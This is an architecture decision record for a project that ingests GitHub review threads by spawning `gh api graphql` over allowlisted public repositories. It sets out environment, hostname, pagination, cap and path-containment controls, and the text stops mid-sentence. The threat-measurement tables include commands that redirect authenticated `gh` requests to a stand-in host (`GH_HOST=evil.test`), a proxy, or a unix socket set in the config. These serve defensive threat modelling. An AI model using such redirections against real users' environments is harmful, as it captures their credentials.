# ADR-0030: Review ingestion spawns `gh`, over public allowlisted repositories only

- Status: proposed
- Date: 2026-09-05
- Deciders: Theurian maintainers
- Requirements: FR-V1, FR-V5, FR-V6, SEC-9, SEC-10, SEC-11, SEC-15, SEC-19, T-3,
  T-7
- Decision recorded in
  [#479](https://github.com/theurian/theurian/issues/479), the Milestone 8
  design-first step for the FR-V GitHub-API arm
- Situates against [ADR-0004](0004-sqlite-is-a-derived-artifact.md) — whose
  *Never Git-tracked (derived)* list named "raw GitHub review caches", and which
  this ADR amends in place: decision 3 withdraws that entry and adds a fourth
  category, ingested content that is authored upstream and not rebuildable —
  [ADR-0013](0013-ai-writes-produce-proposals.md)
  (nothing ingested here becomes approved knowledge),
  [ADR-0019](0019-front-matter-is-data-not-governance.md) (ingested labels are
  data, not governance), [ADR-0026](0026-evidence-plane-not-control-plane.md) (a
  served review thread is evidence; it gates nothing),
  [ADR-0027](0027-accept-validates-before-it-moves.md) (the pre-landing secret
  scan this one mirrors), and
  [ADR-0029](0029-review-findings-are-governed-knowledge.md) (the git-native
  floor of FR-V, which named this arm as explicitly not its own)

**This ADR records a decision and ships no code.** The adapter, the environment
construction, the caps, the version floor, the evidence files, the scan gate, the
serving store, `review.search`, the capability flag, the T-7 rewrite and the
prose-population sweep are all deferred to the slices named in *Slicing plan* and
*Compliance*. Nothing here modifies `SCHEMA_VERSION`, `INDEX_SCHEMA_VERSION`,
`FINDINGS_SCHEMA_VERSION`, any `*.schema.json`, or any `*.py`; the diff is
confined to `docs/`.

**Two measurement frames, kept apart on purpose.**

1. **The measurements that needed the network are quoted, never re-run here** —
   this document's own change performs no network call at all. Two sources, each
   named where it is used, both on **2026-09-05** against **`gh` 2.86.0**:

   | Source | Members |
   | :-- | :-- |
   | The design consult | runs **A**, **B**, **C** (decision 1); the `PullRequestReviewThread` schema introspection (decision 5); the configuration-key observation, `http_unix_socket` versus `api_host` (decision 1); the last-40-merged thread count (*Dispositions*) |
   | Round one's adversarial review | runs **D**, **E**, **F** (decision 1), of which **D** was re-run by the orchestrator and reproduced; the by-PR-number thread population (*Dispositions*), also re-run by the orchestrator |

   They say what was true of that binary and that repository on that date. Slice 1
   re-runs A–F as driving tests, which is where they stop being quotations and
   become controls.
2. **Every repository measurement** was taken on 2026-09-05 against `origin/main`
   @ `1fe3302b`, and each names the command that produced it. Where a
   measurement is a *population*, the key is stated beside the number so a reader
   can attack the key and not only the count.

## Context

[ADR-0029](0029-review-findings-are-governed-knowledge.md) built the git-native
floor of FR-V: `Review-Finding:` trailers parsed out of local history, landed in
their own store, served as `review.findings`. It bounded itself explicitly — "the
GitHub-API arm (threads, inline comments, resolution state, CI results, LLM
candidate generation) is broader, needs credentials, and is not this ADR's to
design". This ADR is that arm's design.

**What exists today, measured.** The domain model is built and nothing fills it:

| Fact | Command (2026-09-05, `origin/main` @ `1fe3302b`) | Result |
| :-- | :-- | :-- |
| The `ReviewProvider` GitHub adapter | `cat packages/theurian-core/src/theurian/infrastructure/github/__init__.py` | a package docstring that says "**Not implemented.** This package holds no adapter and no HTTP client" |
| The capability the server publishes | `grep -n 'reviewIngestion' packages/theurian-core/src/theurian/mcp/tools.py` | `"reviewIngestion": False` (line 1905) |
| The allowlist key | `git grep -n 'providers\.review\.repositories' -- packages/theurian-core/src` | **2** hits, both in `security/project_config.py`'s own docstring prose (`:5`, `:11`) — no reader anywhere |
| The tool names already published as planned | the planned-tools table in `docs/protocol/mcp-tools.md`, lines 352–358 (command and output in *Compliance*) | **7** rows — `review.findings` shipped, six planned, `review.search` among them |
| Places in the shipped package that can start another program | the pinned set in `tests/unit/test_network_call_sites.py` (`PROCESS_SPAWN_SITES`) | **3**: `cli/context.py`, `infrastructure/git/trailer_source.py`, `infrastructure/services/runner.py` — none of them reaches a network |

**T-7 has had the wrong owner twice, and the change that ends that is slice 1 —
not this document, which ships nothing and can only name the owner.**
`docs/security/threat-model.md` records three controls for SSRF — a scheme
allowlist, private-network rejection, and the repository allowlist in
`.theurian/config.yaml` — and none of the three is built.
[#129](https://github.com/theurian/theurian/issues/129) was closed having
corrected the entry's *wording*; the audit then repointed the controls at
[#368](https://github.com/theurian/theurian/issues/368), and review found that
#368 builds no fetch path either. The threat model states the lesson in its own
words: **"an owner has to be the change that would implement the control, and an
epic in the right milestone is not automatically that."**
[#429](https://github.com/theurian/theurian/issues/429) now holds the three
against whatever first performs an external fetch. Slice 1 *is* that change for
the `gh` activation context, where **one** of the three is discharged and one is
*reduced with a recorded residual*; *Dispositions* states which is which, in
which context, and what stays #429's.

**What stands in for the controls today is an absence, and the first spawn site
deletes it.** `tests/unit/test_network_call_sites.py` pins, by equality against
the whole set, that nothing in the shipped package outside three fixed-argument
spawn sites and the daemon's own loopback health probe can open a connection.
Its process-spawn arm was added precisely because a `gh api` adapter "would
contain no client module at all" — a mutation that replaced a fetch with
`subprocess.run(["curl", ...])` survived the entire suite with the network
enumeration green. That file states the admission checklist this ADR has to
satisfy, and it is quoted here rather than paraphrased — the source is a
concatenated Python string, joined here into prose with its `--` set as an em
dash and nothing else changed (`test_network_call_sites.py:653-661`):

> If you added a site, establish before listing it: the argument vector is fixed
> by the adapter rather than taken from a document or a configuration file; the
> command cannot be handed a URL or a remote; there is a timeout; and a test goes
> red when any of those stops holding. If the command *is* meant to reach the
> network — the Milestone 7 `gh api` shape — then the repository allowlist is due
> in the same change, along with the documents that currently promise nothing
> fetches: docs/security/threat-model.md (T-7) and the infrastructure/github/
> package docstring.

So the design problem is not "how do we call GitHub". It is: **the moment a spawn
site is admitted, an absence that many documents rest on stops being true, and
something has to hold what the absence was holding.** Decision 1 is the
replacement, stated in the positive.

## Decision

### 1. GitHub is reached by spawning `gh api graphql`, and the absence control is replaced by a positive invariant

The adapter reaches GitHub by spawning the operator's `gh` binary as an argument
vector. The absence control retires at the commit that adds the site, and the
ten clauses below take its place. **Each clause is a property, and each owes a
test that goes RED when it stops holding** — an invariant with no test is what
the absence was already better than.

| # | The rule | What it prevents | Owed test, and its slice |
| :-- | :-- | :-- | :-- |
| 1 | **Exactly one module may reach GitHub.** The spawn site lives in `infrastructure/github/`, and the pinned spawn-site set grows by exactly that one entry. | A second fetch path added later on a page nobody re-reads; the equality pin catches an addition *and* a removal. | The existing `PROCESS_SPAWN_SITES` equality assertion, extended by one entry, plus a test that no other module in the shipped package names the adapter's spawn helper. Slice 1. |
| 2 | **The endpoint is the literal `graphql`.** Repository identity travels as typed GraphQL variables, never in the URL position. | The `gh api <path>` form interpolates caller data into a path; the GraphQL form has no path segment an owner or repo name can escape into. It also means no raw URL exists for T-7's scheme allowlist to be needed on. | A test that the argument vector's endpoint element equals `graphql` byte-for-byte, and that no element is derived by string-formatting a repository name. Slice 1. |
| 3 | **The destination host is pinned by an explicit `--hostname github.com`.** | An inherited `GH_HOST` silently moving the request to another host — measured to move it (run B). | A test asserting the flag and its value are present in every spawned vector. Slice 1. |
| 4 | **The child environment is CONSTRUCTED from a closed enumerated constant** (`env={...}` passed to the spawn), never inherited and never merely scrubbed. The membership is fixed below, not left to slice 1. | The measured attack class below: *destination and identity taken from inherited environment*. A scrub is a blocklist, and a blocklist has to be right about every variable `gh` and its transport stack read; a constructed environment has to be right about the few Theurian deliberately passes. | **(i)** an **equality** test — the child's environment mapping equals the enumerated constant exactly. It is a strong assertion, not a vacuous one: it goes RED for *every* wrong mapping, including a passed-through parent variable, a missing member and a wrong value, and round two's adversarial review drove it RED five ways. Its can-fail companion is a **mutation of the constant itself**, which is what shows the test reads the constant rather than restating it. **(ii)** a **run-D-shaped fixture** — a config directory carrying `http_unix_socket`, reached through a forwarded config-locating variable — which does two jobs and neither is (i)'s falsifiability: it **demonstrates the residual** (without the refusal, the request leaves through the socket) and it **drives the pre-spawn refusal** (with it, the spawn is refused before it happens). It needs a real `gh`, so it records its own limitation: skipped where the binary is absent, and the skip is reported rather than counted as a pass. Slice 1. |
| 5 | **The `gh` binary is resolved to an absolute path, and the vector is passed with `shell=False`.** | SEC-9 verbatim: "Never build a shell command by string concatenation. `git` and `gh` are invoked as argument vectors with `shell=False`" (`requirements-analysis.md:236`). An unresolved name would also let the child's `PATH` choose the executable; clause 4 means whatever `PATH` the child sees is one this project constructed, and clause 5 means it is not consulted for the executable at all. | A test that the first vector element is an absolute path and that `shell=True` appears nowhere in the module. Slice 1. |
| 6 | **No `--paginate`.** Every page after the first is requested by handing back a GraphQL cursor in a typed variable, with the vector otherwise unchanged. | `--paginate` exists to follow a next-page reference the **response** supplies. Exactly what it follows, and how, is behaviour of a binary this design does not pin (clause 8 bounds only its version) — and that is the reason the flag is excluded rather than characterised: a destination the response chooses is the shape T-7 names, and a cursor in a typed variable cannot become one. | A test that `--paginate` is absent from every spawned vector, and a cursor-pagination test over a recorded fixture. Slice 1. |
| 7 | **A request timeout (SEC-19) and recorded ingest cost bounds: a page cap and a PR-count cap, each a named constant.** Exceeding a cap is a reported, graded stop, never a silent truncation and never an unbounded loop. | A caller — or a large repository — making the system spend work no recorded limit bounds. The severity table grades exactly that as HIGH, and [#26](https://github.com/theurian/theurian/issues/26)'s T-6 concurrency cap is the precedent for how such a bound is recorded: a constant, a test, and prose that names the number. | A test per cap that the constant is the value the adapter uses, and a test that a fixture exceeding the cap stops with a report. Slice 1. |
| 8 | **A `gh` version floor, expressed as a constant with a test, not as prose.** | `gh` is not a Python dependency, so [ADR-0014](0014-dependency-pinning-and-pre-1-0-isolation.md)'s exact pinning does not reach it; the behaviours clauses 2–6 rely on are flag and config behaviours of a binary the operator upgrades independently. Prose asking for "a recent gh" is not a control. | A test that the adapter refuses to spawn below the floor, and that the floor is the constant the refusal message names. Slice 1. Measured against 2.86.0 — the floor is chosen at implementation, not asserted here. |
| 9 | **`gh` absent, or present and unauthenticated, is a graded refusal envelope with a remedy — never a traceback.** The child's stderr surfaces **only inside that envelope**, never straight to a log or a caller. | The failure the product already has a shape for: `requirements-analysis.md:328-329` records `Degraded` as "a success-with-warnings terminal state, not a failure: a missing `gh` token must not prevent local knowledge from working." Ingestion is the optional capability; the rest of the product keeps working. The stderr half is the `GH_DEBUG=api` shape — a debug-verbose child can print request detail, and the environment constant of clause 4 excludes `GH_DEBUG`, so the two halves close it together. | A test for each of the two states asserting a refusal envelope carrying a remedy and no traceback, and a test that child stderr reaches no sink outside the envelope. Slice 1. |
| 10 | **A per-response byte cap, as a named constant, with a typed refusal when a response exceeds it — and the read shape that makes the cap real: the child's output is read incrementally against the cap, not accumulated first and measured after.** | An unbounded `capture_output` of third-party bodies is the same unbounded-work class clause 7 covers for request count, one layer down: a repository's comment bodies are content Theurian does not control. The product already records a bar for a bounded read — `MAX_SOURCE_FILE_BYTES` (8 MiB, `security/paths.py:45`), used by `ingestion_service.py:180` — so the cap is set beside a recorded number rather than invented. | A test that a response past the constant is refused with the typed refusal and not truncated silently, and a test that the read does not buffer the whole response before deciding, spelled so it can fail: a child that emits the cap and then **blocks** rather than exiting — an implementation that accumulates first hangs, one that reads incrementally refuses at the cap and returns. Slice 1. |

#### The attack class clause 4 exists for, measured

Three runs, quoted from the design consult of **2026-09-05, `gh` 2.86.0**. Runs B
and C are the positive controls: without them, a clean run of A would be
consistent with the threat not existing at all.

| Run | Command shape | Observed |
| :-- | :-- | :-- |
| **A** | `GH_HOST=evil.test gh api --hostname github.com graphql …` | request went to `Host: api.github.com` — **the `--hostname` pin holds against `GH_HOST`** |
| **B** | `GH_HOST=evil.test gh api graphql …` (no pin) | error connecting to `evil.test` — **the threat is real**, and A's result is a pin doing work rather than a variable being ignored |
| **C** | `HTTPS_PROXY=http://127.0.0.1:9 gh api --hostname github.com graphql …` | `proxyconnect tcp: dial tcp 127.0.0.1:9` — **the pin does not cover this class**: the request was routed to loopback with the hostname pin in place |

Three further runs, quoted from the **adversarial review of 2026-09-05** (same
binary, `gh` 2.86.0); run D was re-run by the orchestrator before this text was
written and reproduced. They are recorded at the fidelity the round reported them
— each run's shape and its result — and slice 1 re-runs them as clause 4's
positive control:

| Run | Shape | Observed |
| :-- | :-- | :-- |
| **D** | `--hostname github.com` pinned, only allowlisted variables set, `GH_CONFIG_DIR` pointing at an isolated config directory whose config sets `http_unix_socket` | the request went to the unix socket |
| **E** | the same config reached through `HOME` instead | the same |
| **F** | the same config reached through `XDG_CONFIG_HOME` instead | the same |

Runs B, C and D–F are each a positive control for a different half of clause 4: B
shows the `GH_HOST` threat is real rather than ignored, C shows the `--hostname`
pin does not reach the proxy family, and D–F show it does not reach the config
file either. Together they are why clause 4 is *construction* and not *scrubbing
of `GH_HOST`*: the destination is decided by at least three independent inputs,
and a defence that enumerates what an attacker may not set has to be complete
about all of them.

#### Necessity plus enumerated reach — the rule, after two partitions failed

Two earlier drafts of this ADR tried to split the environment by *what a variable
carries*, and both are retracted here rather than left standing. The first —
*credentials may pass, destination-movers may not* — admits the `GH_TOKEN` family,
which is identity taken from the caller's environment and so the second half of
the very class clause 4 exists to close. The second kept that split and added the
config-locating variables anyway, which runs D–F show to be destination-bearing:
**it excluded exactly the variables it admitted.** A rule that contradicts its own
table is not a rule. What replaces it is not a partition by content at all:

> **A variable is admitted only if `gh` cannot locate the operator's persisted
> authentication — or its platform credential store — without it. Every admitted
> variable's transport reach is then enumerated: reduced where a check exists,
> recorded as a residual where none does. Everything else is excluded by
> equality.**

Necessity is the admission test; reach is what is enumerated afterwards, per
variable, in the open. No variable is admitted because of what it *cannot* do.

**The closed enumerated constant.** The child environment is exactly the rows
below, and the table is the constant — there is no "and similar":

| Variable | Value | Why it is admitted | Transport reach |
| :-- | :-- | :-- | :-- |
| `HOME` | forwarded by value | `gh` locates its config directory and the operator's persisted login through it | reaches the config file — **reduced** by slice 1's pre-spawn refusal, TOCTOU residual recorded below |
| `GH_CONFIG_DIR` | forwarded by value | the same, when the operator sets it explicitly | the same |
| `XDG_CONFIG_HOME` | forwarded by value | the same, on the XDG path | the same |
| `NO_COLOR` | `1` | machine-readable output | none |
| `GH_NO_UPDATE_NOTIFIER` | `1` | **set, not merely absent**: without it `gh` performs its own 24-hour release check — an outbound request no argument vector of ours chose (`gh` 2.86.0's documented environment, read in round two) | removes an outbound request |
| `GH_PROMPT_DISABLED` | `1` | a spawned `gh` must never block on an interactive prompt | none |
| `GH_NO_EXTENSION_UPDATE_NOTIFIER` | `1` | same class as the update notifier: a check nobody asked for | removes an outbound request |
| `PATH` | a **Theurian-constructed** value, not the parent's | `gh` shells out (`git`, credential helpers); an inherited `PATH` would let the parent environment choose those binaries | chooses helper binaries, not destinations |

**Nothing else.** `GH_TOKEN`, `GITHUB_TOKEN`, `GH_ENTERPRISE_TOKEN` and
`GITHUB_ENTERPRISE_TOKEN` fail the admission test outright — `gh` finds the
operator's persisted login without them — so identity never comes from a caller's
environment. Headless environment-token authentication is a **recorded non-goal**
until somebody needs it, at which point it is a decision with its own reasoning
rather than a variable quietly added to this table.

**One platform question is open, and it is answered by measurement, not by
guessing.** On Linux the credential store is reached through a session bus
(`DBUS_SESSION_BUS_ADDRESS`, `XDG_RUNTIME_DIR`), and whether `gh` can find a
stored credential without them is **not measured here** — this machine is macOS.
Slice 1 owes that measurement **in CI**, on Linux, and the constant gains a
platform member **only if the measurement says the credential is otherwise
unreachable**. The rule stays fixed either way: the equality test pins whatever
the constant records on that platform, so "fixed membership" is a property of the
rule, not a claim that today's eight rows are the final list.

#### The residual, on the measured storage facts

The premise an earlier draft rested on — *the same directory holds `hosts.yml`,
and so the operator's token* — is **false in `gh` 2.86.0's default
configuration**. Two measurements, both from round two and both re-verified:

- **The default credential store is the OS keychain.** `hosts.yml` on this machine
  carries no `oauth_token`; a plaintext token in that file is the
  `--insecure-storage` fallback, not the default.
- **Redirecting and writing are different acts.** Pointing a config-locating
  variable at a *new* directory loses the credential too — `gh` reports itself
  unauthenticated. Writing a transport override **into the operator's real located
  directory** does not: the keychain hands `gh` the token as usual, and `gh` hands
  the authenticated request to the attacker's socket. **The credential is captured
  without ever being read.**

So the residual is not "an attacker who could already read the token". It is: **an
actor able to write the operator's own `gh` config directory can redirect an
authenticated request and capture what it carries, without holding the credential
themselves.** Slice 1's pre-spawn refusal of known transport-override keys reduces
it to a race — a writer landing the key between the check and the spawn still wins
— and that TOCTOU race is the surviving residual, recorded rather than closed.

**The precondition, named because it is the operator's trust and not Theurian's
check.** The directory in question is the operator's own, user-owned by
construction; Theurian does not inspect its permissions or ownership, and does not
propose to. (Measured on 2.86.0, `http_unix_socket` is a real configuration key
while `api_host` is not — which is why both the refusal and this residual name the
*class* of transport-override settings and not one key.) Clause 4's test (ii)
keeps the residual demonstrated rather than argued, and drives the refusal that
reduces it.

**Theurian borrows the operator's ambient GitHub identity, and holds no token.**
Ingestion runs with **whatever scopes the operator's `gh` login already has**,
which may include private repositories. That is accepted, because the alternative
is Theurian taking custody of a token (rejected in *Alternatives considered*), and
because the control that keeps ingestion off private repositories is decision 2's
allowlist and its refusal — not the credential's reach.

### 2. Scope: public allowlisted repositories only, and the argument is an audience argument

The adapter reads `providers.review.repositories` **before any spawn**. The key
is already schema-ready: `schemas/config/project-config.schema.json` types it as
an array of strings matching `^[\w.-]+/[\w.-]+$`, beside a
`providers.review.adapter` enum of `github | none` defaulting to `none`. Its
description says "Not in force… Nothing reads it today", and slice 1 is the change
that makes both sentences false and rewrites them.

Three refusals, each with a synthetic-input driving test owed to slice 1:

1. **A repository not in the allowlist is refused before the process is
   spawned.** Not filtered after the fetch — the spawn does not happen.
2. **A repository that resolves as private is refused at ingestion**, even if it
   is in the allowlist, and nothing about it is written.
3. **The repository the response describes is checked back against the allowlisted
   entry.** GitHub redirects a renamed `owner/repo`, so an allowlisted name can
   resolve to a repository nobody allowlisted. The adapter compares the response's
   resolved `nameWithOwner` against the entry it asked for, **case-folded** —
   GitHub treats owner and repository names case-insensitively, so a
   byte-comparison would refuse a correct answer. The repository **id** is checked
   only against a previously recorded one: on a first ingest there is nothing to
   compare it to, and an id read out of the same response it is meant to validate
   proves nothing. Owed a slice-1 test with a renamed-repository fixture and a
   case-difference fixture.

**The argument for public-only v1 is an audience argument, and it must be written
narrowly.** The tempting sentence — "a public repository cannot carry embargoed
content" — is false as a universal, and this ADR does not make it: a public
repository's review threads can discuss anything, including an unpublished
vulnerability, and this project's own embargo discipline exists precisely because
people are capable of putting such a thing where it does not belong. The true and
narrower claim is:

> Public-only v1 ingests **no advisory-private GitHub surface** (private
> repositories, security advisories, private forks), and every record it holds
> was **visible to the public repository's audience at the moment it was
> ingested**.

That is the same structural shape ADR-0029 decision 6 records for public `main`:
the protection is *structural* — the source has no access to the withheld
surface — and it is not a claim that the public surface is guaranteed clean. What
guards the second half is unchanged from the rest of the product: the secret scan
at ingestion (decision 4) and the untrusted-content triple at serve (decision 6).

**The tense is load-bearing, and the residual it names is retention.** Decision 3
makes the evidence files durable precisely so an upstream delete does not erase
the record — which means *"visible to the public audience"* is true at ingestion
time and can stop being true afterwards, when an author edits or deletes a
comment upstream. This ADR does not pretend otherwise, and it does not build a
propagation path either: an upstream delete does not reach Theurian's copy, and
there is no mechanism that would notice one. **The remediation path exists and is
manual**: delete the evidence file and rebuild the derived store, which is
exactly the operation decision 3's files-as-source shape already supports (the
store is rebuilt from the files, so removing a file removes the record from every
surface). A capability that would make it automatic is not designed here and is
listed in *What this does not close*.

**The private-repository arm stays owed, and it keeps a named owner.** ADR-0029
assigned it to this arm: a finding marked `securityRelated` at ingestion time,
where advisory state is available, then refused **uniformly** at serve — the
refusal must not distinguish "an embargoed item exists and is withheld" from "no
such item exists". Milestone 8 does not build it, and this ADR does not hand it to
an unnamed follow-up either: **it is owned by
[#575](https://github.com/theurian/theurian/issues/575)**, the change that adds
private-repository ingestion. ADR-0029's owed table and the threat model's
embargo-arm sentence are **repointed to #575 in the same commit as this ADR;
nothing pins them to each other thereafter** — a later edit to either can drift,
and no test would notice. An owed item whose owner is "a follow-up" is the
owner-position defect this document diagnoses twice elsewhere, and it is not
repeated here.

**The scope is machine-visible, not only prose.** `system.capabilities` today
publishes `reviewIngestion: false` beside `reviewFindings: true`, and
`docs/roadmap.md` records why those two are separate flags: "the change that
reaches GitHub is the one that owes SEC-10's repository allowlist … and an
offline trailer read owes none." The same reasoning applies one level down, so
the flag alone is not enough: a client that reads `reviewIngestion: true` and
nothing else would conclude that review history is ingested wherever the operator
points it. The decision is therefore **`reviewIngestion: true` plus a scope
field** — proposed shape `reviewIngestionScope: "public-allowlisted"`, a string
beside the booleans, which the capability block already does elsewhere
(`knowledgeSearch: "hybrid"`, `mcp/tools.py:1868`) — flipped together at the serve
slice, with the wire schema change that publishes them landing in slice 3.

**The flag's published meaning narrows, and that redefinition is stated here
rather than performed quietly.** Today `reviewIngestion: false` is read as *this
build cannot reach GitHub*. From slice 3 the flag means *an ingestion call surface
exists that a client may call* — a narrower promise, because the fetch path will
have shipped two slices earlier while the flag was still `false`. Redefining a
published flag without moving what cites it is how a security statement becomes
false, so slice 1 moves the sites that record the old meaning.

**The population is a key with stated exclusions, not a list somebody believed was
complete.** An earlier draft of this section named six sites and claimed they were
every one; round two found eight more, including a byte-pinned test constant and
the adapter package's own docstring. The key, measured 2026-09-05 against `origin/main` @ `1fe3302b` — this branch changes none of the files it selects, so the reading is the same on either side:

```console
$ git grep -n "reviewIngestion" -- . ':!.claude' ':!.theurian' ':!docs/work-logs' \
    ':!docs/adr/0030-*' ':!*CHANGELOG.md' | wc -l
      25
$ git grep -l "reviewIngestion" -- . ':!.claude' ':!.theurian' ':!docs/work-logs' \
    ':!docs/adr/0030-*' ':!*CHANGELOG.md' | wc -l
      12
```

**The exclusions, each with its reason:** `.claude/` is orchestration, not a
shipped record; `.theurian/` is the frozen corpus, which moves by re-seed and
never by edit; `docs/work-logs/` are dated records of what was believed then;
CHANGELOGs are the same; this ADR is excluded because it is a member of the
population it measures.

**What a person then judged, from those 25 lines.** Sites recording the old
*meaning* — these move in slice 1:

| Site | Kind | What it says today |
| :-- | :-- | :-- |
| `docs/security/threat-model.md:1703` | document | the flag is `false`, pinned by `test_capabilities_report_what_is_and_is_not_built` |
| `docs/security/threat-model.md:1712-1715` | document | the flag "that has to move before this entry's controls become load-bearing" |
| `docs/protocol/mcp-tools.md:346-348` | document | "`reviewIngestion` is the one that reaches GitHub" |
| `docs/roadmap.md:46-51` | document | "still `false`: nothing reaches GitHub" |
| `docs/roadmap.md:247` | document | the same `false` cited as a build property |
| `README.md:205` | document | the flag quoted in the AI-proposes-humans-approve row |
| `docs/architecture/review-knowledge.md:26` | document | "`system.capabilities` reports `reviewIngestion: false`" |
| `plugins/claude-code/commands/ingest.md:29` | document (user-facing) | the same sentence, in the plugin's own command page |
| `packages/theurian-core/src/theurian/mcp/tools.py:1900` | production source | the inline capability comment beside the flag |
| `packages/theurian-core/src/theurian/infrastructure/github/__init__.py:5` | production source | the adapter package's own docstring |
| `packages/theurian-core/src/theurian/review/__init__.py:6` and `:16` | production source | the same, in the review package |
| `packages/theurian-core/tests/integration/test_mcp_tools.py:2060-2064` | **test** (docstring) | "a capability flag is a security statement when it is `reviewIngestion`" |
| `packages/theurian-core/tests/integration/test_mcp_tools.py:1975` and `:1980` | **test** (two assertion messages) | the messages a failing capability assertion prints |
| `packages/theurian-core/tests/unit/test_config_key_call_sites.py:739` | **test** (byte-pinned constant) | `INGEST_CONFIG_BULLET`, which pins the plugin sentence above **byte for byte** — so the plugin page and this constant move together or the test goes RED |

**Composition, because it decides who does the work:** eight documents, four
production-source sites and three test sites. Slice 1 is therefore not a prose
pass — a byte-pinned constant and two assertion messages are code changes, and the
plugin page cannot move without its pin.

**What is in the key's output and does *not* move in slice 1**, judged rather than
silently dropped: `docs/roadmap.md:26` and `docs/protocol/mcp-tools.md:17` state
the flag's **value**, which flips at slice 3, not its meaning;
`docs/adr/0026-evidence-plane-not-control-plane.md:111` is another ADR's recorded
prose about its own decision; `test_mcp_tools.py:1887`, `:2078` and
`docs/roadmap.md:650` name the flag as a key in a list rather than describing what
it promises.

The flag itself does not flip until slice 3, because until then there is nothing
for a client to call; the two facts are separated in the documents rather than
papered over by moving the flip.

**The window that leaves is a bounded residual, recorded rather than argued
away.** Through slices 1 and 2 the machine-readable answer is `reviewIngestion:
false` while a fetch path ships — the documents will say what is true, but a
client that reads only the flag gets the retiring meaning. The alternative was
considered: publish the scope field early, in slice 1, so the machine-readable
surface moves with the code. It was not taken because the field's honest value in
slice 1 is *"a fetch path exists that no tool exposes"*, which is a third meaning
for a flag already being redefined once, and it would ship a wire-schema change
two slices before the surface it describes. The residual's reach is bounded by
what the flag can be used for: no tool is callable, so a client acting on the
`false` loses nothing it could have had.

### 3. Evidence files are the source; SQLite is derived

Normalized evidence records land as **structured JSON files under
`.theurian/review/`** — durable, git-trackable, and deliberately **not** under
`.theurian/cache/`. The SQLite serving store (slice 3) is built from those files
and is deletable.

**This settles a contradiction that was live in four records, not one.** Round one
corrected the sentence it had read and asserted the contradiction settled; round
two found three more records still carrying the withdrawn position. All four are
corrected in this PR, and naming them all is the point — an enumeration that stops
at the file you happened to open is how this class recurs:

| Record | What it said |
| :-- | :-- |
| `docs/architecture/review-knowledge.md` (Privacy) | "The review cache is a derived artifact under `.theurian/cache/`, git-ignored and rebuildable" |
| `docs/adr/0004-sqlite-is-a-derived-artifact.md:42` | "raw GitHub review caches" listed under *Never Git-tracked (derived)* — withdrawn by an in-place amendment |
| `docs/architecture/overview.md:89` | a *Review cache* row at `.theurian/cache/`, not Git-tracked, rebuildable |
| `docs/architecture/requirements-analysis.md:879` (OQ-8) | "`.theurian/cache/reviews/`, git-ignored, rebuildable from the GitHub API" — a **recorded design answer**, which is why leaving it would have kept the old decision live |

The quoted wording is kept here because the reasoning, not the corrected
sentence, is what a later reader needs. That sentence is safe for an artifact
whose source outlives it. It is not safe here:
**GitHub review comments are editable and deletable upstream**, so a deleted local
copy of a comment that has since been deleted upstream is **data loss, not a cache
miss**, and no refetch recovers it. "Rebuildable" would be asserting a property
the upstream does not provide.

With files as the source, [ADR-0004](0004-sqlite-is-a-derived-artifact.md)'s real
property comes back: **deleting the SQLite store is a cache miss, because the
store is rebuilt from the evidence files.** The contrast with the findings store
is worth stating honestly, because the two look alike and are grounded
differently — `infrastructure/sqlite/findings_schema.py` says so in its own
docstring: the findings store is safe to delete because "the source of truth is
**git history** … and this file is reconstructed wholesale by replaying the git
source." Review evidence has no such replayable source. So:

| Artifact | Why deleting it is safe | Layer ([ADR-0010](0010-three-layer-knowledge-model.md)) |
| :-- | :-- | :-- |
| Review-finding store (ADR-0029) | it is safe: git history is replayable | **Canonical**, projected from git |
| **Review evidence files (this ADR)** | **it is not safe — deleting them is data loss** | **Canonical**, carrying a `SourceAnchor` — but with **no replayable source** |
| Review serving store (slice 3) | it is safe: rebuilt from the evidence files | Index / derived |

**The middle row is a case ADR-0010's three layers do not have, and it is named
rather than forced into one of them.** The bytes GitHub returned are Source; what
lands on disk is a *normalized record Theurian wrote*, which is the same operation
ADR-0029 places in **Canonical** — so putting the evidence files in Source would
contradict that precedent for an identical act. What makes them unlike every other
Canonical artifact is the property in the middle column: `findings_schema.py` says
the findings store is safe to delete because "the source of truth is **git
history** … and this file is reconstructed wholesale by replaying the git source",
and review evidence has **no such replay**. So this is a Canonical record whose
own source is not re-readable — the fourth-category case ADR-0004's Milestone 8
amendment records — and it carries a `SourceAnchor` (FR-S3) naming the upstream
object it came from, precisely because that anchor is the only remaining pointer
to material Theurian can no longer re-fetch.

**Paths are built from ids, never from allowlist strings.** An evidence file's
path is derived from **provider-generated identifiers, or a hash of the repository
identity** — never by joining the configured `owner/repo` string into a
filesystem path. The reason is measurable today: the schema pattern
`^[\w.-]+/[\w.-]+$` accepts `../..`, so a joined path escapes the directory while
satisfying the config schema. Two controls, both owed:

- **Every write resolves through `security/paths.py`'s containment**
  (`resolve_within_root`, `assert_no_symlink_escape`) — the same SEC-7 containment
  the rest of the product uses, applied to the *write* path and not only to a
  served `filePath` field.
- **The schema pattern is tightened to reject `.` and `..` segments**, and that
  tightening lands in slice 1's allowlist-reader commit — the commit that first
  makes the key load-bearing is the commit that makes its values safe.

**Refetch is a best-effort refresh, never the durability story.** A later
ingestion run updates what upstream still returns and does not delete what it no
longer does; a record that vanished upstream stays in the evidence files, marked
with the run that last saw it. Whether a project commits `.theurian/review/` is
the project's decision — the directory is not written into the ignore block. What
lands in it is also subject to the configurable ingestion-time redaction
review-knowledge.md's Privacy section describes, which is design and not shipped
behaviour: no review ingestion path exists to perform it — the GitHub package
holds no adapter, measured in *Context* — and **it is slice 2's, applied at
landing, beside the scan gate**, since both are decisions about what a file may
contain before it is written.

#### The evidence record's field set, enumerated once

The scan gate (decision 4) and the serving trust table (decision 6) need the same
population, so it is written here once. Every field FR-V1 names is listed with
**who controls its value** — which decides both whether the scan reads it and
which side of the trust boundary it is served on:

| Field | Controlled by | Trust class | Read by the ingestion scan |
| :-- | :-- | :-- | :-- |
| repository `owner/name`, PR number, event key, review / thread / comment ids | the provider | structural | no — no free text |
| thread state, resolution state, `isResolved` / `isOutdated`, timestamps, diff side, line numbers | the provider | structural | no |
| head, fix and merge commit shas; linked issue numbers; CI rollup outcome | the provider | structural | no |
| participant `external_id` | the provider | structural | no |
| **comment body, review body, PR title, PR description** | the author | **untrusted** | **yes** |
| **participant `display_name`** | the author | **untrusted** | **yes** |
| **file path as received** | the author (whoever named the file in the PR) | **untrusted** | **yes** |
| **labels, head branch name, milestone name** | the author | **untrusted** | **yes** |
| `SourceAnchor` (provider, source URI, upstream object id, path) | **Theurian**, at ingestion | structural | no — it is written here, not received |
| last-seen-run stamp (which run last observed the record upstream) | **Theurian**, at ingestion | structural | no |

**Three values in the *Controlled by* column, not two.** A record carries fields
